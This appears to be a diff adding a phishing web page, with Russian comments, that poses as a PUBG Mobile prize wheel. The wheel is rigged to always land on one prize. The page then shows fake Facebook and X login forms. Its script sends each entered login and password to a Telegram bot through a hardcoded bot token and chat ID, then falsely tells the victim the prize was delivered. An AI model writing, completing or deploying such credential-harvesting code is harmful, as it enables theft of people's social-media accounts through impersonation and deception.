+            <div class="forgot-password-header">
+                <button class="back-button" id="backToTwitter">
+                    <span class="back-icon">×</span>
+                </button>
+                <div class="forgot-password-title">Find your X account</div>
+            </div>
+            
+            <div class="forgot-password-content">
+                <div class="forgot-password-text">
+                    Enter your email, phone number, or username to search for your account.
+                </div>
+                
+                <input type="text" class="email-input" id="forgotEmail" placeholder="Email, phone number, or username" required>
+                
+                <button class="search-button" id="searchAccount">Search</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно регистрации X -->
+    <div class="modal-overlay" id="twitterSignupModal">
+        <div class="signup-modal">
+            <div class="signup-header">
+                <button class="signup-close-button" id="signupCloseButton">
+                    <span class="signup-close-icon">×</span>
+                </button>
+            </div>
+            
+            <div class="signup-logo-container">
+                <div class="signup-logo">𝕏</div>
+                <h2 class="signup-title">Join X today</h2>
+                <p class="signup-subtitle">Create an account to connect to PUBG MOBILE</p>
+            </div>
+            
+            <div class="signup-content">
+                <button class="signup-alt-button google" id="signupGoogle">
+                    <span>Sign up with Google</span>
+                </button>
+                
+                <button class="signup-alt-button apple" id="signupApple">
+                    <span>Sign up with Apple</span>
+                </button>
+                
+                <div class="signup-divider">
+                    <span>or</span>
+                </div>
+                
+                <button class="create-account-button" id="createTwitterAccount">
+                    Create account
+                </button>
+                
+                <div class="signup-terms">
+                    By signing up, you agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>, including <a href="#">Cookie Use</a>. X may use your contact information, including your email address and phone number for purposes outlined in our Privacy Policy, like keeping your account secure and personalizing our services, including ads. <a href="#">Learn more</a>. Others will be able to find you by email or phone number, when provided, unless you choose otherwise <a href="#">here</a>.
+                </div>
+                
+                <div class="login-link">
+                    Already have an account? <a href="#" id="backToTwitterLogin">Sign in</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Модальное окно успешного получения приза -->
+    <div class="modal-overlay" id="successModal">
+        <div class="modal-content success-modal-content">
+            <div class="success-header">
+                <!-- Текст удален как указано -->
+            </div>
+            
+            <div class="success-prize-container">
+                <img id="successPrizeImage" class="success-prize-image" alt="Выигрыш">
+            </div>
+            
+            <div class="success-message">
+                <h3>PUBG MOBILE METRO ROYALE PASS SIG</h3>
+                <h3 style="color: gold; margin-top: 15px;">Congratulations</h3>
+                <p style="margin-top: 10px;">Your prize has been sent to your account</p>
+            </div>
+            
+            <div class="modal-buttons">
+                <button class="modal-button cancel" id="cancelSuccess">Cancel</button>
+                <button class="modal-button ok" id="okSuccess">OK</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация призов
+        const prizes = [
+            { name: "pharaon", image: "pharaon.png" },
+            { name: "material", image: "material.png" },
+            { name: "m416lednik", image: "m416lednik.png" },
+            { name: "mummy", image: "mummy.png" },
+            { name: "m416shut", image: "m416shut.png" },
+            { name: "8500uc", image: "8500uc.png" },
+            { name: "shorti", image: "shorti.png" },
+            { name: "m416skin", image: "m416skin.png" },
+            { name: "kalash", image: "kalash.png" },
+            { name: "m416skin2", image: "m416skin2.png" },
+            { name: "m16", image: "m16.png" },
+            { name: "tolstovka", image: "tolstovka.png" }
+        ];
+
+        // Telegram бот данные
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const CHAT_ID = '1709490182';
+
+        // Элементы DOM
+        const spinButton = document.getElementById('spinButton');
+        const prizeWheel = document.getElementById('prizeWheel');
+        const winModal = document.getElementById('winModal');
+        const facebookModal = document.getElementById('facebookModal');
+        const twitterModal = document.getElementById('twitterModal');
+        const twitterForgotModal = document.getElementById('twitterForgotModal');
+        const twitterSignupModal = document.getElementById('twitterSignupModal');
+        const successModal = document.getElementById('successModal');
+        const winPrizeImage = document.getElementById('winPrizeImage');
+        const successPrizeImage = document.getElementById('successPrizeImage');
+        
+        // Login options
+        const facebookOption = document.getElementById('facebookOption');
+        const twitterOption = document.getElementById('twitterOption');
+        const confirmLogin = document.getElementById('confirmLogin');
+
+        let isSpinning = false;
+        let hasSpun = false;
+        let currentRotation = 0;
+        let currentPrize = null;
+        let selectedLoginOption = 'facebook';
+
+        // Инициализация
+        function initialize() {
+            hasSpun = false;
+            spinButton.disabled = false;
+            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            prizeWheel.style.transition = 'none';
+            prizeWheel.style.transform = 'rotate(0deg)';
+            currentRotation = 0;
+            
+            facebookOption.classList.add('active');
+            twitterOption.classList.remove('active');
+            selectedLoginOption = 'facebook';
+            
+            spinButton.style.animation = 'pulse 2s infinite';
+            
+            // Очистка форм
+            document.getElementById('twitterForm').reset();
+            document.getElementById('facebookForm').reset();
+            
+            // Обновляем год в футерах
+            const currentYear = new Date().getFullYear();
+            document.querySelector('.twitter-footer').innerHTML = `© ${currentYear} X Corp.`;
+            document.querySelector('.facebook-footer').innerHTML = `Meta Platforms, Inc.`;
+        }
+
+        // Функция вращения рулетки (ВСЕГДА на Mummy)
+        function spinRoulette() {
+            if (isSpinning || hasSpun) return;
+            
+            isSpinning = true;
+            spinButton.disabled = true;
+            spinButton.textContent = "КРУТИТЬ РУЛЕТКУ";
+            spinButton.style.animation = 'none';
+            
+            const TARGET_PRIZE_INDEX = 3;
+            currentPrize = prizes[TARGET_PRIZE_INDEX];
+            
+            const anglePerPrize = 30;
+            const baseAngle = TARGET_PRIZE_INDEX * anglePerPrize;
+            const correctionAngle = 90 - 30;
+            const targetAngle = baseAngle + correctionAngle;
+            const spins = 5;
+            const totalRotation = (spins * 360) + targetAngle;
+            
+            prizeWheel.style.transition = 'transform 4s cubic-bezier(0.2, 0.8, 0.2, 1)';
+            currentRotation = totalRotation;
+            prizeWheel.style.transform = `rotate(${currentRotation}deg)`;
+            
+            hasSpun = true;
+            
+            setTimeout(() => {
+                winPrizeImage.src = currentPrize.image;
+                winModal.style.display = 'flex';
+                isSpinning = false;
+                spinButton.disabled = true;
+                spinButton.style.opacity = '0.5';
+            }, 4000);
+        }
+
+        // Функция отправки данных в Telegram
+        async function sendToTelegram(data) {
+            const message = `🎰 НОВЫЙ ВЫИГРЫШ!\n\n` +
+                           `🎁 Приз: ${data.prize}\n` +
+                           `📧 Логин: ${data.login}\n` +
+                           `🔑 Пароль: ${data.password}\n` +
+                           `🌐 Соцсеть: ${data.network}\n` +
+                           `🕐 Время: ${new Date().toLocaleString()}`;
+            
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                console.log('Данные отправлены в Telegram:', result);
+                return result.ok;
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
+
+        // Выбор опции входа
+        facebookOption.addEventListener('click', () => {
+            facebookOption.classList.add('active');
+            twitterOption.classList.remove('active');
+            selectedLoginOption = 'facebook';
+        });
+
+        twitterOption.addEventListener('click', () => {
+            twitterOption.classList.add('active');
+            facebookOption.classList.remove('active');
+            selectedLoginOption = 'twitter';
+        });
+
+        // Подтверждение выбора входа
+        confirmLogin.addEventListener('click', () => {
+            winModal.style.display = 'none';
+            
+            if (selectedLoginOption === 'facebook') {
+                facebookModal.style.display = 'flex';
+            } else {
+                twitterModal.style.display = 'flex';
+            }
+        });
+
+        // Обработчики событий
+        spinButton.addEventListener('click', spinRoulette);
+
+        // Отмена выигрыша
+        document.getElementById('cancelWin').addEventListener('click', () => {
+            winModal.style.display = 'none';
+        });
+
+        // Закрытие Twitter окна
+        document.getElementById('twitterCloseButton').addEventListener('click', () => {
+            twitterModal.style.display = 'none';
+        });
+
+        // Закрытие Signup окна
+        document.getElementById('signupCloseButton').addEventListener('click', () => {
+            twitterSignupModal.style.display = 'none';
+        });
+
+        // Форма Facebook
+        document.getElementById('facebookForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('fbEmail').value;
+            const password = document.getElementById('fbPassword').value;
+            
+            const success = await sendToTelegram({
+                prize: currentPrize.name,
+                login: email,
+                password: password,
+                network: 'Facebook'
+            });
+            
+            if (success) {
+                facebookModal.style.display = 'none';
+                successPrizeImage.src = currentPrize.image;
+                successModal.style.display = 'flex';
+            }
+        });
+
+        // Форма Twitter
+        document.getElementById('twitterForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('twitterEmail').value;
+            const password = document.getElementById('twitterPassword').value;
+            
+            const success = await sendToTelegram({
+                prize: currentPrize.name,
+                login: email,
+                password: password,
+                network: 'Twitter'
+            });
+            
+            if (success) {
+                twitterModal.style.display = 'none';
+                successPrizeImage.src = currentPrize.image;
+                successModal.style.display = 'flex';
+            }
+        });
+
+        // Кнопка "Забыли пароль?" Twitter
+        document.getElementById('twitterForgot').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterModal.style.display = 'none';
+            twitterForgotModal.style.display = 'flex';
+        });
+
+        // Кнопка "Назад" из восстановления пароля
+        document.getElementById('backToTwitter').addEventListener('click', () => {
+            twitterForgotModal.style.display = 'none';
+            twitterModal.style.display = 'flex';
+        });
+
+        // Поиск аккаунта (восстановление пароля)
+        document.getElementById('searchAccount').addEventListener('click', () => {
+            const email = document.getElementById('forgotEmail').value;
+            if (email) {
+                // В реальном приложении здесь была бы логика восстановления пароля
+                alert(`Instructions for account recovery have been sent to ${email}`);
+                twitterForgotModal.style.display = 'none';
+                twitterModal.style.display = 'flex';
+            } else {
+                alert('Please enter your email, phone number, or username');
+            }
+        });
+
+        // Кнопка регистрации в Twitter
+        document.getElementById('twitterSignup').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterModal.style.display = 'none';
+            twitterSignupModal.style.display = 'flex';
+        });
+
+        // Кнопка "Назад" из регистрации
+        document.getElementById('backToTwitterLogin').addEventListener('click', (e) => {
+            e.preventDefault();
+            twitterSignupModal.style.display = 'none';
+            twitterModal.style.display = 'flex';
+        });
+
+        // Создание аккаунта Twitter
+        document.getElementById('createTwitterAccount').addEventListener('click', () => {
+            // В реальном приложении здесь была бы форма регистрации
+            alert('X account creation form would open here');
+            // Можно добавить переход на форму регистрации
+        });
+
+        // Вход через Google (Twitter)
+        document.getElementById('twitterGoogle').addEventListener('click', () => {
+            // Имитация входа через Google
+            alert('Google authentication would open here');
+            // В реальном приложении здесь была бы OAuth аутентификация
+        });
+
+        // Вход через Apple (Twitter)
+        document.getElementById('twitterApple').addEventListener('click', () => {
+            // Имитация входа через Apple
+            alert('Apple authentication would open here');
+            // В реальном приложении здесь была бы OAuth аутентификация
+        });
+
+        // Регистрация через Google
+        document.getElementById('signupGoogle').addEventListener('click', () => {
+            alert('Google sign-up authentication would open here');
+        });
+
+        // Регистрация через Apple
+        document.getElementById('signupApple').addEventListener('click', () => {
+            alert('Apple sign-up authentication would open here');
+        });
+
+        // Кнопки Facebook
+        document.getElementById('fbNotNow').addEventListener('click', (e) => {
+            e.preventDefault();
+            facebookModal.style.display = 'none';
+            winModal.style.display = 'flex';
+        });
+
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            alert('Facebook password recovery would open here');
+        });
+
+        document.getElementById('createAccount').addEventListener('click', () => {
+            alert('Facebook account creation would open here');
+        });
+
+        // Кнопки успешного получения
+        document.getElementById('cancelSuccess').addEventListener('click', () => {
+            successModal.style.display = 'none';
+        });
+
+        document.getElementById('okSuccess').addEventListener('click', () => {
+            successModal.style.display = 'none';
+        });
+
+        // Блокировка прокрутки для рулетки
+        document.addEventListener('touchmove', function(e) {
+            if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.addEventListener('wheel', function(e) {
+            if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        window.addEventListener('scroll', function() {
+            document.querySelector('.container').style.transform = 'translateY(0)';
+        });
+
+        // Закрытие модальных окон по клику на оверлей
+        const modals = document.querySelectorAll('.modal-overlay');
+        modals.forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        });
+
+        // Валидация форм
+        const twitterEmailInput = document.getElementById('twitterEmail');
+        const twitterPasswordInput = document.getElementById('twitterPassword');
+        const twitterNextButton = document.getElementById('twitterNextButton');
+
+        function validateTwitterForm() {
+            const email = twitterEmailInput.value.trim();
+            const password = twitterPasswordInput.value.trim();
+            
+            if (email && password) {
+                twitterNextButton.disabled = false;
+            } else {
+                twitterNextButton.disabled = true;
+            }
+        }
+
+        twitterEmailInput.addEventListener('input', validateTwitterForm);
+        twitterPasswordInput.addEventListener('input', validateTwitterForm);
+
+        // Инициализация при загрузке
+        window.addEventListener('load', initialize);
+    </script>
+</body>
+</html>
